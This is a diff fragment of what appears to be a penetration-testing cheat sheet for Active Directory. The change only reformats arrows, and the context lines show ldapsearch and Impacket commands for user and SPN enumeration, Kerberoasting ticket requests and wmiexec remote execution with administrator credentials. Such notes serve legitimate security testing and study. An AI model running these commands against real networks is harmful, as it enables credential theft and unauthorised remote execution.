@@ -206,22 +206,22 @@ The service alfresco needs Kerberos pre-authentication to be disabled. This mean
 ldapsearch -x -h <IP> -p <PORT> -D 'USERNAME' -w 'PASSWORD' -b "dc=DOMAIN,dc=DOMAIN2" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
 OR
 ./GetADUsers.py -all DOMAIN/USERNAME -dc-ip <IP>
------> EX: ./GetADUsers.py -all domain.com/svc_tgs -dc-ip 10.0.0.1
+→ EX: ./GetADUsers.py -all domain.com/svc_tgs -dc-ip 10.0.0.1
 
 ➤ Verify if a SPN exist
 ldapsearch -x -h 10.0.0.1 -p 389 -D 'SVC_TGS' -w'password' -b "dc=domain,dc=com" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
 OR
 ./GetUserSPNs.py DOMAIN/USERNAME -dc-ip <IP>
------> EX: ./GetUserSPNs.py domain.com/svc_tgs -dc-ip 10.0.0.1
------> OUTPUT: active/CIFS:445 -> a SPN exist
+→ EX: ./GetUserSPNs.py domain.com/svc_tgs -dc-ip 10.0.0.1
+→ OUTPUT: active/CIFS:445 -> a SPN exist
 
 ➤ Request a SPN token
 ./GetUserSPNs.py DOMAIN/USERNAME -dc-ip <IP> -request
------> EX: ./GetUserSPNs.py domain.com/svc_tgs -dc-ip 10.0.0.1 -request
+→ EX: ./GetUserSPNs.py domain.com/svc_tgs -dc-ip 10.0.0.1 -request
 
 ➤ Wmiexec equivalent to psexec
 ./wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
------> EX: ./wmiexec.py domain.com/administrator:password@10.0.0.1
+→ EX: ./wmiexec.py domain.com/administrator:password@10.0.0.1
 ```
 
 
